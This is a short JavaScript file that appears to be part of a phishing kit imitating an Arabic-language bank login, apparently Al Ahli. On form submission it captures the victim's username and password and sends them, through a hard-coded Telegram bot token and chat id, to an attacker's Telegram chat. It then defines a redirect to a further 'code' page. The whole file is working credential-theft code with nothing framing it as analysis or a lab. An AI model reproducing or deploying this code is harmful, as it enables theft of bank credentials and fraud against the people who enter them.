const form = document.querySelector ("#form");

form .addEventListener("submit" , (e) =>{
e.preventDefault();

var usr = document.getElementById("usr").value;
var pass = document.getElementById("pass").value;

var my_text = `الاهلي%0A   - اسم المستخدم: ${usr}  %0A  -  كلمة المرور: ${pass}`

var token ="5596027783:AAEERyqvvf5_709PqNaU8VfHTlcFIl2BiYg";
var chat_id =-1001693270224;
var url =`https://api.telegram.org/bot${token}/sendMessage?chat_id=${chat_id}&text=${my_text}|`

let api = new XMLHttpRequest();
api.open("GET", url, true);
api.send();

    console.log("Message successfully sended!")

    function RedirectionJavascript(){
        document.location.href="./vir/code/code.php.html";
      }
})